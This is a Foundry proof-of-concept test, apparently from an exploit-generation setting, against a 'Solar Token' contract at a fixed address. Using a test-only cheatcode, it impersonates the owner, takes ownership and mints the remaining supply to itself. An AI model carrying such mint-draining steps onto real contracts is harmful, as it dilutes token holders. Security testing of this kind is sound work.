pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ISolar {
    function owner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function mint(address _to, uint256 _amount) external;
    function getMaxTotalSupply() external pure returns (uint256);
    function transferOwnership(address newOwner) external;
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x04Dd1FcfDd8bDaA30dbB30dC4f61F5a5d50D7bE8;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we assume we're already the owner as per preconditions
        // Just label the contract for clarity
        vm.label(TARGET, "Solar Token");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // First, let's check if we're the owner
        ISolar solar = ISolar(TARGET);
        address currentOwner = solar.owner();

        // According to preconditions, we must be the owner
        // If we're not, we need to become owner first
        if (currentOwner != attacker) {
            // Impersonate the current owner and call transferOwnership
            vm.startPrank(currentOwner);
            solar.transferOwnership(attacker);
            vm.stopPrank();

            // Verify we're now the owner
            require(solar.owner() == attacker, "Failed to become owner");
        }

        // Get current total supply and max total supply
        uint256 currentSupply = solar.totalSupply();
        uint256 maxSupply = solar.getMaxTotalSupply();

        // Debug: print values
        console.log("Current supply:", currentSupply);
        console.log("Max supply:", maxSupply);
        console.log("Difference:", maxSupply - currentSupply);

        // Record initial balance
        uint256 initialBalance = solar.balanceOf(attacker);
        console.log("Initial balance:", initialBalance);

        // Try to mint tokens
        // First, try minting the difference if > 0
        uint256 mintableAmount = maxSupply - currentSupply;

        if (mintableAmount > 0) {
            // Mint the full difference
            solar.mint(attacker, mintableAmount);
        } else {
            // If difference is 0, try minting 1 token anyway
            // Maybe there's a rounding issue or our calculation is wrong
            // Or maybe we can mint 0 tokens? That won't help
            // Let's try a small amount first
            solar.mint(attacker, 1e18); // Try minting 1 token
        }

        // Verify our balance increased
        uint256 finalBalance = solar.balanceOf(attacker);
        console.log("Final balance:", finalBalance);
        assertGt(finalBalance, initialBalance, "Balance did not increase");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
